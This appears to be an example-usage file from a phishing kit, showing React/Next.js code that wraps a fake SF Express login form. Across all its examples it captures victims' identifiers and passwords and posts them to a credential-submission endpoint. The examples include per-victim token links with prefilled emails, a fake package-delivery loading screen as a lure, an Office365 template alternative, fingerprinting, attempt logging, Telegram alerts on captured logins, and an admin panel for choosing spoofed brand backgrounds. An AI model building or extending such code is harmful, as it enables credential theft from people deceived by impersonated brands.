/**
 * EXAMPLE: How to Use SF Express Login Form
 * 
 * This file shows various integration examples.
 * Copy the example that fits your use case.
 */

import SFExpressLoginForm from '@/components/LoginForm/SFExpressLoginForm'
import { useRouter, useSearchParams } from 'next/navigation'
import { useState } from 'react'

// ════════════════════════════════════════════════════════════════════════════
// EXAMPLE 1: Basic Usage
// ════════════════════════════════════════════════════════════════════════════

export function BasicExample() {
  const handleSubmit = async (identifier: string, password: string) => {
    console.log('Login attempt:', { identifier, password })
    
    // Add your submission logic here
    const response = await fetch('/api/submit-credentials', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ identifier, password })
    })
    
    if (!response.ok) throw new Error('Login failed')
  }

  return <SFExpressLoginForm onSubmit={handleSubmit} />
}

// ════════════════════════════════════════════════════════════════════════════
// EXAMPLE 2: With Pre-filled Email from URL
// ════════════════════════════════════════════════════════════════════════════

export function EmailPrefillExample() {
  const searchParams = useSearchParams()
  const email = searchParams.get('email') || ''

  const handleSubmit = async (identifier: string, password: string) => {
    // Your submission logic
    console.log('Submitting:', { identifier, password })
  }

  return (
    <SFExpressLoginForm
      email={email}
      onSubmit={handleSubmit}
    />
  )
}

// ════════════════════════════════════════════════════════════════════════════
// EXAMPLE 3: With Custom Background Image
// ════════════════════════════════════════════════════════════════════════════

export function CustomBackgroundExample() {
  const handleSubmit = async (identifier: string, password: string) => {
    console.log('Login with custom background')
  }

  return (
    <SFExpressLoginForm
      onSubmit={handleSubmit}
      backgroundImage="/images/custom-warehouse.png"
    />
  )
}

// ════════════════════════════════════════════════════════════════════════════
// EXAMPLE 4: Complete Integration with Error Handling
// ════════════════════════════════════════════════════════════════════════════

export function CompleteExample() {
  const router = useRouter()
  const [error, setError] = useState('')

  const handleSubmit = async (identifier: string, password: string) => {
    try {
      // Submit to your API
      const response = await fetch('/api/submit-credentials', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: identifier,
          password: password,
          timestamp: Date.now(),
          // Add your fingerprint, device info, etc.
        })
      })

      const data = await response.json()

      if (data.success) {
        // Redirect to success page
        router.push('/success')
      } else {
        throw new Error(data.error || 'Login failed')
      }
    } catch (err: any) {
      setError(err.message)
      throw err // Let the component handle the error display
    }
  }

  return (
    <div>
      <SFExpressLoginForm
        onSubmit={handleSubmit}
      />
    </div>
  )
}

// ════════════════════════════════════════════════════════════════════════════
// EXAMPLE 5: Token-Based Access (Like your existing system)
// ════════════════════════════════════════════════════════════════════════════

export function TokenBasedExample({ 
  token,
  extractedEmail 
}: { 
  token: string
  extractedEmail: string 
}) {
  const router = useRouter()

  const handleSubmit = async (identifier: string, password: string) => {
    // Submit with token context
    const response = await fetch('/api/verify-credentials', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        token: token,
        identifier: identifier,
        password: password,
        fingerprint: await generateFingerprint(),
      })
    })

    const data = await response.json()

    if (data.success) {
      // Record the attempt
      await recordAttempt(token, identifier, true)
      
      // Send Telegram notification
      await sendTelegramNotification({
        token,
        email: identifier,
        status: 'success'
      })
      
      // Redirect
      router.push('/thank-you')
    } else {
      await recordAttempt(token, identifier, false)
      throw new Error('Invalid credentials')
    }
  }

  return (
    <SFExpressLoginForm
      email={extractedEmail}
      onSubmit={handleSubmit}
    />
  )
}

// ════════════════════════════════════════════════════════════════════════════
// EXAMPLE 6: With Loading Template Before Form
// ════════════════════════════════════════════════════════════════════════════

export function WithLoadingTemplateExample() {
  const [showForm, setShowForm] = useState(false)

  // Show loading template for 3-5 seconds
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowForm(true)
    }, 4000)
    
    return () => clearTimeout(timer)
  }, [])

  if (!showForm) {
    return <PackageDeliveryScreen /> // Your existing loading template
  }

  return (
    <SFExpressLoginForm
      onSubmit={async (identifier, password) => {
        // Handle submission
      }}
    />
  )
}

// ════════════════════════════════════════════════════════════════════════════
// EXAMPLE 7: Multi-Template System (Choose template dynamically)
// ════════════════════════════════════════════════════════════════════════════

export function MultiTemplateExample({ 
  templateType,
  email 
}: { 
  templateType: string
  email: string 
}) {
  const handleSubmit = async (identifier: string, password: string) => {
    // Universal submission handler
    console.log('Template:', templateType, 'Login:', identifier)
  }

  if (templateType === 'sfExpress') {
    return (
      <SFExpressLoginForm
        email={email}
        onSubmit={handleSubmit}
      />
    )
  }

  if (templateType === 'office365') {
    return <Office365Template email={email} onSubmit={handleSubmit} />
  }

  // Default fallback
  return <GenericLogin email={email} onSubmit={handleSubmit} />
}

// ════════════════════════════════════════════════════════════════════════════
// EXAMPLE 8: Admin Panel - Background Image Selector
// ════════════════════════════════════════════════════════════════════════════

export function AdminPanelExample() {
  const [selectedBackground, setSelectedBackground] = useState('/images/sf-warehouse-bg.png')
  const [previewMode, setPreviewMode] = useState(false)

  const backgrounds = [
    { value: '/images/sf-warehouse-bg.png', label: 'Warehouse (Default)' },
    { value: '/images/sf-delivery-bg.png', label: 'Delivery Trucks' },
    { value: '/images/sf-airport-bg.png', label: 'Airport Cargo' },
  ]

  return (
    <div className="admin-panel">
      <h2>SF Express Template Settings</h2>
      
      <div className="background-selector">
        <label>Background Image:</label>
        <select 
          value={selectedBackground}
          onChange={(e) => setSelectedBackground(e.target.value)}
        >
          {backgrounds.map(bg => (
            <option key={bg.value} value={bg.value}>{bg.label}</option>
          ))}
        </select>
      </div>

      <button onClick={() => setPreviewMode(!previewMode)}>
        {previewMode ? 'Hide Preview' : 'Show Preview'}
      </button>

      {previewMode && (
        <div className="preview">
          <SFExpressLoginForm
            backgroundImage={selectedBackground}
            onSubmit={async () => {
              alert('Preview mode - form disabled')
            }}
          />
        </div>
      )}
    </div>
  )
}

// ════════════════════════════════════════════════════════════════════════════
// HELPER FUNCTIONS (Examples)
// ════════════════════════════════════════════════════════════════════════════

async function generateFingerprint(): Promise<string> {
  // Your existing fingerprint generation logic
  return 'fingerprint-hash'
}

async function recordAttempt(token: string, email: string, success: boolean) {
  // Record to database
  console.log('Recording attempt:', { token, email, success })
}

async function sendTelegramNotification(data: any) {
  // Send to Telegram
  console.log('Telegram notification:', data)
}

// ════════════════════════════════════════════════════════════════════════════
// REAL-WORLD USAGE IN YOUR APP
// ════════════════════════════════════════════════════════════════════════════

/**
 * In your app/t/[token]/page.tsx:
 */

/*
import SFExpressLoginForm from '@/components/LoginForm/SFExpressLoginForm'

export default async function TokenPage({ params }: { params: { token: string } }) {
  const { token } = params
  
  // Get token info from database
  const tokenData = await getTokenData(token)
  
  // Check if SF Express template
  if (tokenData.template === 'sfExpress') {
    return (
      <SFExpressLoginForm
        email={tokenData.email}
        onSubmit={async (identifier, password) => {
          // Your existing credential submission logic
          await submitCredentials(token, identifier, password)
        }}
      />
    )
  }
  
  // Other templates...
}
*/

/**
 * In your app/api/submit-credentials/route.ts:
 */

/*
export async function POST(req: Request) {
  const { identifier, password, token } = await req.json()
  
  // Validate credentials
  // Record attempt
  // Send notifications
  // Return response
  
  return NextResponse.json({
    success: true,
    message: 'Credentials received'
  })
}
*/

// ════════════════════════════════════════════════════════════════════════════
// NOTES
// ════════════════════════════════════════════════════════════════════════════

/**
 * 1. The identifier can be:
 *    - Email address (tab 2)
 *    - Phone number with country code like "+1234567890" (tab 1)
 *    - Username (tab 3)
 * 
 * 2. The component handles:
 *    - Multi-language translations
 *    - Form validation
 *    - Loading states
 *    - Error display
 * 
 * 3. You need to provide:
 *    - onSubmit handler that returns a Promise
 *    - Error handling (throw errors to display in form)
 *    - Success handling (redirect, etc.)
 * 
 * 4. Optional props:
 *    - email: Pre-fill email address
 *    - backgroundImage: Custom warehouse image URL
 */

